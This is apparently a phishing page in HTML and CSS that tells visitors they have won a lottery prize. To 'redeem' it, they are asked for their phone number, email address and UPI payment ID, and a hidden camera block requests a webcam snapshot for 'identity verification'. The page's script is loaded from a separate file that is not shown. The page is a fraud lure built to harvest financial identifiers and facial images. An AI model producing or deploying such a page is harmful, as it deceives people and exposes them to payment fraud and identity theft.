<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations! You Won!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            padding: 30px;
            max-width: 500px;
            width: 100%;
        }
        h1 {
            color: #ff5722;
            margin-bottom: 20px;
        }
        p {
            color: #333;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        button:hover {
            background-color: #45a049;
        }
        #cameraContainer {
            display: none;
            margin-top: 20px;
        }
        #cameraFeed, #cameraSnapshot {
            width: 100%;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        #captureBtn {
            margin-top: 10px;
        }
        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background-color: #f00;
            border-radius: 50%;
            animation: fall 5s linear infinite;
        }
        @keyframes fall {
            to {
                transform: translateY(100vh);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸŽ‰ Congratulations! You Won! ðŸŽ‰</h1>
        <p>You've been selected as the winner of our grand lottery prize! To claim your reward, please fill out the details below and click "Redeem".</p>
        
        <div class="form-group">
            <label for="phone">Phone Number</label>
            <input type="tel" id="phone" placeholder="Enter your phone number" required>
        </div>
        
        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" id="email" placeholder="Enter your email address" required>
        </div>
        
        <div class="form-group">
            <label for="upi">UPI ID</label>
            <input type="text" id="upi" placeholder="Enter your UPI ID" required>
        </div>

        <div id="cameraContainer">
            <h3>Verify Your Identity</h3>
            <video id="cameraFeed" autoplay></video>
            <canvas id="cameraSnapshot" style="display: none;"></canvas>
            <button id="captureBtn">Take Snapshot</button>
        </div>
        
        <button id="redeemBtn">Redeem Prize</button>
    </div>

    <script src="script.js"></script>
</body>
</html>
